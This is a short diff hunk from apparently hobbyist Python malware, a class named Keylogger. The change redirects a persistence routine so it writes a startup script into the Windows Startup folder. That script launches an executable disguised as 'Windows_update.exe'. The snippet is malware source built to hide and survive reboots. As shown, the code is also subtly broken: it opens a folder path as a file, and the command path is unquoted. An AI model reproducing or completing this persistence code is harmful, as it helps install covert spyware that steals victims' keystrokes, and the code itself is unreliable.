@@ -34,7 +34,7 @@ class Keylogger:
     def change_dir(self):
         try:
             username = getpass.getuser()
-            with open(fr"/home/phoenix693/Desktop/start.py", 'w') as file:
+            with open(fr'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\', 'w') as file:
             # Write content to the file
                 file.write(f"""import os
                 os.system(E:\Windows_update.exe)""")
